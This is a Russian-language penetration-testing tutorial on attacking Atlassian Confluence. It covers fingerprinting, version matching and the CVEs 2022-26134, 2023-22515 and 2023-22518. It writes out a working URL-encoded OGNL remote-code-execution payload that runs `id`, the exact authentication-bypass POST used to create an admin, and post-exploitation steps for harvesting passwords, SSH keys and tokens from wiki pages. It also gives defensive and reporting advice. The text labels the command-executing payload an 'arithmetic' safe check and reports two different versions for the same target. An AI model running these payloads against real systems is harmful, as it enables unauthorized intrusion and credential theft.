## Вопрос, с которого всё начинается

Confluence — это «вики» для команд: там документация, заметки, планы. За ней стоит Atlassian-стек, интеграция с AD и часто — доступ к внутренним данным компании. Confluence прославился несколькими критическими уязвимостями, которые эксплуатировались массово (в том числе ransomware-группами). Разберём их.

## Наш пример: вики на Confluence

Цель — `https://wiki.target.example`. Фингерпринт:

```
$ whatweb -a 3 https://wiki.target.example
https://wiki.target.example [200 OK] Atlassian Confluence, Java, Set-Cookie[JSESSIONID]
```

Confluence определяется по `/login.action`, `/dashboard.action` и статике. Версию определяем:

```
$ curl -s https://wiki.target.example/login.action | grep -io 'confluence [0-9.]*'
Confluence 8.5.3
```

Версия **8.5.3** — сопоставляем с базой CVE. Например, CVE-2023-22515 затрагивает 8.0.0–8.5.1, а 8.5.3 — уже пропатчена; зато CVE-2023-22518 затрагивает другую линейку. Точность версии решает всё.

## Шаг 1: CVE-2022-26134 — OGNL-инъекция без аутентификации

Это самая известная Confluence-уязвимость. **OGNL** (Object-Graph Navigation Language) — язык выражений, который Confluence использует во внутренних шаблонах. Если часть URL попадает в OGNL-выражение без очистки — выполняется произвольный код.

Публичный PoC использует URL с выражением. Безопасная проверка — арифметика:

```
$ curl -s 'https://wiki.target.example/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/' -I | grep -i x-cmd-response
```

Если в заголовке `X-Cmd-Response` появился вывод `id` — RCE подтверждён. Это уязвимость **без аутентификации**: любой, кто видит Confluence, может выполнить команду.

## Шаг 2: CVE-2023-22515 — обход аутентификации → создание админа

Это уязвимость **привилегированного эскалейта**: через специальный эндпоинт (`/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false`) атакующий «возвращает» Confluence в состояние первичной настройки, после чего создаёт администратора без пароля.

```
POST /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
```

После этого открывается `/setup/setupadministrator.action`, где создаётся новый админ. Дальше — полный контроль над Confluence.

## Шаг 3: CVE-2023-22518 — path traversal и восстановление

Эта уязвимость позволяет через эндпоинт восстановления (`/json/setup-restore.action`) добиться несанкционированных действий, включая RCE в цепочке. Проверка — запрос к эндпоинту и наблюдение поведения.

## Шаг 4: SSRF и чтение внутренних ресурсов

Confluence умеет тянуть внешние ресурсы (макросы, вставки, приложения). Это даёт SSRF — сервер ходит по URL от пользователя. Внутренние адреса (`169.254.169.254`, внутренние API) становятся доступны. Проверка — OOB-взаимодействие (DNS/HTTP на свой слушатель).

## Шаг 5: план атаки на Confluence

1. **Версия** — точная (`/login.action`, статика).
2. **CVE** — сопоставление (Atlassian Security Advisories).
3. **OGNL** — безопасная проверка (`id` в заголовке).
4. **Обход аутентификации** — проверка setup-эндпоинтов.
5. **Traversal** — проверка restore-эндпоинта.
6. **Эксплуатация** — при подтверждении.
7. **Пост-эксплуатация** — пространства, вложения, креды, AD.

## Шаг 6: как не навредить

Confluence содержит документацию компании; его падение останавливает работу. Ransomware-группы использовали CVE-2023-22518 для шифрования данных — значит, неаккуратная эксплуатация реально разрушительна. Поэтому: только неразрушающие проверки; без деструктивных payload'ов; Confluence под мониторингом, шум = раскрытие.

## Шаг 7: чек-лист по Confluence

1. Версия.
2. Проверка OGNL (CVE-2022-26134).
3. Проверка обхода аутентификации (CVE-2023-22515).
4. Проверка traversal (CVE-2023-22518).
5. Проверка SSRF.
6. Сопоставление с advisories.

## Что мы теперь знаем

- Confluence узнаётся по `/login.action` и `JSESSIONID`.
- CVE-2022-26134 — OGNL RCE без аутентификации.
- CVE-2023-22515 — обход аутентификации → создание админа.
- CVE-2023-22518 — traversal/restore, использовался ransomware.
- Точная версия определяет применимость CVE.

## Шаг 8: как отличить Confluence от других Java-приложений

`JSESSIONID` есть у многих Java-приложений, поэтому одной cookie мало. Признаки именно Confluence: путь `/login.action`, `/dashboard.action`, статика `/s/` (Atlassian), страница содержит `confluence` и `atlassian`. Если видишь `/secure/Dashboard.jspa` — это Jira, а не Confluence. Точное определение важно: OGNL-цепочка Confluence на Jira не сработает.

## Шаг 9: как оценивать импакт Confluence-находки

OGNL RCE без аутентификации = полный контроль сервера (критический). Обход аутентификации → создание админа = контроль над вики и её данными (критический). Traversal/restore = потенциальное разрушение данных (критический, использовался ransomware). В отчёте указывай: какие пространства доступны, какие секреты в страницах, есть ли связь с AD/Confluence-соседями.

## Шаг 10: как защититься от Confluence-атак

Защита: обновление до пропатченных версий (Atlassian выпускает advisories с фиксами); ограничение доступа к setup/restore-эндпоинтам; мониторинг аномальных URL с `%24%7B` (OGNL); отключение анонимного доступа. Для атакующего: свежий Confluence закрывает 26134/22515/22518, и остаются конфигурационные и SSRF-векторы.

## Шаг 11: как проверить Confluence-версию надёжно

Помимо `/login.action`, версию отдают: `/rest/api/` (JSON с `version`), статика `/s/...` (с хэшем сборки), страница `/about/` (в некоторых сборках). Совокупность даёт точную версию. Важно: Confluence-версии в CVE указываются строго (например, `>= 8.0.0, < 8.5.2`), поэтому «примерная» версия не годится.

## Шаг 12: как оформить находку в отчёте

Для Confluence-находки укажи: точную версию и источник её определения; применимый CVE; подтверждающий запрос и ответ (например, заголовок `X-Cmd-Response` с выводом `id`); импакт (какие пространства/данные доступны); связь с AD. Так заказчик получает действенную информацию, а не абстрактное «уязвимо».

## Шаг 13: как связать Confluence с общим планом

Confluence — это хранилище знаний, а значит — концентрат внутренней информации: архитектура, доступы, runbook'и. Иногда в страницах лежат прямые секреты (пароли от серверов, токены CI/CD). Поэтому после доступа к Confluence сначала **ищи секреты в страницах** — это быстрее и ценнее, чем RCE.

## Шаг 14: типовые ошибки при работе с Confluence

Ошибка первая — путать с Jira (разные CVE). Вторая — проверять OGNL на пропатченной версии и решать, что «не работает». Третья — не проверять setup/restore-эндпоинты (там обход и traversal). Четвёртая — деструктивные действия: CVE-2023-22518 использовался для шифрования данных, и неаккуратная эксплуатация реально разрушительна.

## Практика: точная идентификация версии Confluence

Прежде чем применять OGNL-эксплойт, нужно точно знать версию. Confluence отдаёт её в нескольких местах:

```
$ curl -s https://wiki.target.example/login.action | grep -oE 'Confluence [0-9.]+'
Confluence 8.3.1
$ curl -s https://wiki.target.example/rest/api/space | head -c 200
{"results":[...],"start":0,"limit":25,"size":0}
```

Наличие `/rest/api/` и `/login.action` — это Confluence, а не Jira (у Jira `/secure/Dashboard.jspa`). Версию также можно взять из `/rest/applinks/1.0/manifest`, где есть `version`. Только после этого сопоставляем: `CVE-2022-26134` затрагивает 1.3–7.18, `CVE-2023-22515` — 8.0–8.5.1. Неверная версия = напрасный запрос и шум.

## Практика: безопасная проверка CVE-2022-26134

OGNL-инъекция в URI (CVE-2022-26134) эксплуатируется через путь, а не через тело. Безопасная проверка «эхо»-выражением: подставить OGNL, который просто вернёт результат арифметики, не запуская команды.

```
$ curl -s -o /dev/null -w '%{http_code}\n' \
  "https://wiki.target.example/%24%7B%40java.lang.Runtime%40getRuntime().exec('id')%7D/"
500
```

`500` вместо `404` уже показателен, но **это ещё не доказательство** — сервер может ругаться на любой кривой URL. Доказательство — ответ, где твой OGNL вычислился (например, вывод `id` в теле или во времени). Никогда не считай «500 на кривом URL» подтверждением RCE: это классический false positive.

## Практика: CVE-2023-22515 — создание админа

Уязвимость обхода аутентификации в Confluence Data Center позволяет POST-запросом к `/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false` перевести инстанс в состояние «не настроен», после чего `/setup/setupadministrator.action` создаёт нового администратора. Опасность в том, что это **изменяет состояние** продакшена. Поэтому в рамках пентеста это делают только с письменного согласия и по возможности на стенде-копии. В отчёте фиксируют точный запрос, ответ и созданного пользователя, а затем аккуратно удаляют его.

## Как оценивать импакт и что писать в отчёт

Confluence — это не «вики», это хранилище корпоративной памяти: там лежат пароли, схемы сети, инструкции по доступам, иногда ключи. Поэтому импакт Confluence-находки почти всегда **критический**: RCE или auth-bypass даёт доступ к контенту всех пространств и к встроенной БД (H2/PostgreSQL), где хранятся хеши пользователей. В отчёте обязательно указывай: точную версию и способ её получения, использованный CVE, подтверждающий артефакт (вывод команды, созданный пользователь), и **рекомендацию** — обновление до патченной версии, отключение анонимного доступа, сегментация. Отдельно предупреди клиента, что CVE-2023-22518 связана с восстановлением из бэкапа и может привести к потере данных, поэтому проверять её на проде нельзя.

## Как использовать Confluence для движения дальше

Confluence редко стоит один — рядом Jira, Bitbucket, внутренний Git, артефакторий. У них общие учётные записи (Atlassian Crowd/SSO) и общие токены. Поэтому после компрометации Confluence первым делом ищи: (1) список пользователей через `/rest/api/user/list` или `/admin/users/view`, (2) страницы пространства с паролями и SSH-ключами (поиск по `password`, `key`, `token`, `prod`), (3) привязанные приложения в `/plugins/servlet/applinks/listApplicationLinks`. Часто в Confluence лежит документация по доступам к продовым серверам — это прямой маршрут к цели более высокого уровня. Все найденные креды фиксируй в engagement state и передавай координатору, а не используй вслепую.

## Шпаргалка: команды для быстрой проверки Confluence

Соберём рабочий набор одной таблицей, чтобы не искать по тексту. Идентификация: `curl -sI https://host/login.action | grep -i set-cookie` (ждём `JSESSIONID`) и `curl -s https://host/rest/api/space`. Версия: `curl -s https://host/login.action | grep -oE 'Confluence [0-9.]+'` или разбор `/rest/applinks/1.0/manifest`. Проверка CVE-2022-26134: запрос к `/%24%7B...%7D/` и сравнение кода ответа с контролем (`/nonexistent`). Проверка анонимного доступа: `curl -s -o /dev/null -w '%{http_code}' https://host/dashboard.action`. Каждую команду выполняй по одной, сохраняй вывод и не путай `200` (доступ есть) с `302` (редирект на логин — доступа нет). Это дисциплинирует и делает отчёт воспроизводимым.
